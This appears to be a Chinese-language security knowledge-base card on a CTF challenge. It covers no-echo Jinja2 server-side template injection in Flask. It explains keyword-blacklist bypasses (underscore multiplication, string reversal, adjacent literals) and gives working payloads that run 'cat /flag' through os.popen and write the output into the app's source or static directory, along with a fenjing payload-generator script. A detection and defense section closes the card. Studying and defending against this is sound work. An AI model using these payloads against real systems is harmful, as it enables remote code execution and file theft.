---
id: web-python-ssti-jinja2-noecho-flag-write-into-source
title: Jinja2 SSTI 无回显出链：下划线乘法拼出双下划线、字符串反序拼出 os、相邻字面量拼 import，把 cat /flag 重定向写进自身源码再 GET 读回
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-ssti-noecho-command-output-write-into-source-file
tags:
- python
- flask
- jinja2
- ssti
- no-echo
- file-write
- blacklist-bypass
- waf-bypass
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:36:49+08:00'
  notes: 已对照原文核对；本次核对未读取图片；黑名单列表、render_template_string 只返回 ok/error 的无回显前提、GET / 用 open(__file__)+html.escape 返回源码这一回显端点、fenjing 自定义 waf oracle 用法均与正文一致；原文最终 payload 被 Markdown 吞掉下划线（显示为 '*'），卡片按 '_'*2 语义还原并已注明属还原而非原文逐字；
url: /docs/web/python/ssti/web-python-ssti-jinja2-noecho-flag-write-into-source/
draft: false
kb_aliases:
- 无回显 SSTI 写文件回显
- Safe_Proxy SSTI
- cat /flag 重定向写源码
- 下划线乘法拼接绕过双下划线过滤
- 字符串反序绕过 os 过滤
- Jinja2 无回显写源码
---

## 一句话结论

当 `render_template_string` 只返回 `ok`／`error` 而不回显渲染结果时，SSTI 仍是完整 RCE：让模板执行 `os.popen('cat /flag>app.py')`，把命令输出覆盖写进「GET 一下就能读全文」的自身源码，再正常请求该路由取回输出；黑名单里的 `__`、`os`、`import`、`popen` 分别用 `'_'*2`（运行期拼出 `__`）、`'so'[::-1]`（反序）、相邻字面量 `'i''mport'`／`'p''open'` 绕过。

## 原理

- **无回显不等于无执行**：`render_template_string(template_code)` 必然求值模板里的表达式，本题只是把结果 `print` 到服务端标准输出、HTTP 响应用 `'ok' if result is not None else 'error'` 顶替，所以「响应里看不到结果」只丢掉了回显通道，执行原语还在。
- **把输出搬到可读位置**：同一路由 GET 时执行 `open(__file__)` 并把源码 `html.escape` 后返回，于是「把命令输出重定向进 `__file__`」等价于给自己开了一个常驻可读的回显端点——`cat /flag>app.py` 之后普通 GET 就能读到 flag。
- **黑名单是子串匹配而非语法分析**：`['__','import','os','sys','eval','subprocess','popen','system','\r','\n']` 逐个 `if black in template_code` 判断，而 Jinja2/Python 有大量等价写法不含这些连续子串：
  - `'_'*2` 在运行期拼成 `__`，源码中只有单个下划线；
  - `'so'[::-1]` 在运行期得到 `os`；
  - 相邻字符串字面量在词法阶段拼接，`'i''mport'`、`'p''open'` 的源码中不存在 `import`、`popen` 子串；
  - 用 `[]` 下标访问替代 `.` 属性链，用 `{%set%}` 先把片段存进变量再引用，可绕过对长模式与点号的匹配。
- **属性链仍然成立**：`g.pop` → `__globals__` → `__builtins__` → `__import__('os')` → `popen(...)`。`g` 是 Flask 注入的模板全局，`pop` 是 dict 方法，用下标取遮蔽属性后照常往下走。

## 触发条件

- 用户输入被拼进 Jinja2 模板（`render_template_string`、`Environment().from_string`），且未使用 `SandboxedEnvironment`。
- 存在关键字黑名单，但未过滤 `{%` 语句块、`[]`、`|attr`、字符串乘法/切片。
- 渲染结果不回显，但目标存在任意一条「可写且可读」的落地点：自身源码、静态目录、上传目录、模板缓存。

## 利用步骤

1. GET 路由读源码，确认两件事：黑名单内容、以及「GET 会把源码返回」这个自带回显端点。
2. 本地用同版本 Flask 复刻一份（把 `return 'ok'` 临时改成 `return result`），用 fenjing 传入自定义 waf oracle（`dangerous_patterns` 命中即返回 False）生成可过黑名单的载荷，`exec_cmd_payload(waf, 'cat /flag>>app.py')` 这类接口直接给命令即可。
3. 命令改写成写文件型：`cat /flag>app.py`（覆盖，读回时源码只剩 flag）或 `cat /flag>>app.py`（追加）；也可写 `static/a`、`templates/x.html` 等可访问位置。
4. POST 表单 `code=<payload>`；返回 `ok` 只说明渲染没抛异常，不代表执行失败，别据此放弃。
5. GET 路由读全文，从源码里取命令输出。

## PoC

`POST /`，`Content-Type: application/x-www-form-urlencoded`：

```text
code={%print g.pop['_'*2+'globals'+'_'*2]['_'*2+'builtins'+'_'*2]['_'*2+'i''mport'+'_'*2]('so'[::-1])['p''open']('cat /flag>app.py').read()%}
```

用 `{%set%}` 分段（更短、更易读，且每段都不含黑名单子串）：

```text
{%set gl='_'*2+'globals'+'_'*2%}{%set bu='_'*2+'builtins'+'_'*2%}{%set im='_'*2+'i''mport'+'_'*2%}{%set ey='so'[::-1]%}{{g.pop[gl][bu][im](ey)['p''open']('cat /flag>>app.py').read()}}
```

写静态目录的变体（题目不出网、也不允许改源码时可换落地点）：

```text
{%print(config|attr('_' '_class_' '_')|attr('_' '_init_' '_')|attr('_' '_globals_' '_')|attr('_' '_getitem_' '_')('o''s')|attr('po''pen')('mkdir static;cat /f* > static/a')|attr('read')())%}
```

本地 waf oracle（把黑名单当判断函数喂给 fenjing）：

```python
from fenjing import exec_cmd_payload

def waf(s):
    return not any(p in s for p in ['__', 'import', 'os', 'sys', 'eval',
                                    'subprocess', 'popen', 'system', '\r', '\n'])

print(exec_cmd_payload(waf, 'cat /flag>>app.py')[0])
```

## 变体与关联

- 无回显的三条出链：写文件（本例，最省事且适合「源码可读」的靶）、反弹 shell、注入路由/内存马。
- 若 `{%print%}` 被拦，用 `{{ ... }}`、`{%set x=...%}{{x}}`；若 `.` 被拦用 `[]` + `|attr`；若 `g` 不可用，从 `config`、`request`、`lipsum`、`cycler` 起步。
- 关键字拆分可任意组合：`'_'*2`（下划线）、`'so'[::-1]`（反序）、`'i''mport'`／`'p''open'`（相邻字面量）、`/f*`（通配文件名）、`$IFS`（命令侧空格）——凡黑名单按子串匹配，就找「源码不含该子串但求值相同」的等价形式。
- 关联：JSON body 入口下用 `{%print%}` 替代 `{{ }}` 的同类绕过、以及相邻字符串字面量的基础技巧卡；本卡差异在于「无回显 + 以自身源码作为回显端点」这一出链方式。

## 检测与防御

- 不要对用户输入调用 `render_template_string`；必须动态渲染时用固定模板 + 变量绑定，输入只作数据。
- 使用 `SandboxedEnvironment`，并禁用 `{%` 语句块、`attr`、`[]` 与危险全局（`g`、`config`、`lipsum`、`cycler`）。
- 别把「源码可 GET 回读」和「渲染输入」放在同一个可写文件上；源码/模板目录对进程只读。
- 检测：模板输入中出现字符串乘法拼接（`'_'*2`）、`[::-1]` 反序、相邻字符串字面量（`'a''b'`）、`>`/`>>` 重定向写 `.py`／`static`；监控渲染线程派生的 `sh -c` 子进程与工作目录内源码文件的 mtime 突变。
